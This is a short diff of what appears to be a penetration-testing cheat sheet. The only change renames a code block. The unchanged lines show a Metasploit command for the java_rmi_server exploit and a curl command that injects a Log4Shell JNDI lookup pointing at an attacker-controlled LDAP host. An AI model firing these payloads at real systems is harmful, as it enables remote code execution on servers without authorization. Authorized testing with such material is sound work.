@@ -15,7 +15,7 @@ msfconsole -x "use exploit/multi/misc/java_rmi_server; run; exit"
 
 Send a JNDI lookup string in the User-Agent header.
 
-```sh title:"Send Log4Shell JNDI User-Agent probe"
+```sh title:"Java Send Log4Shell JNDI User-Agent probe"
 curl -H 'User-Agent: ${jndi:ldap://$lhost:$lport}' "$url"
 ```
 <!-- cheat
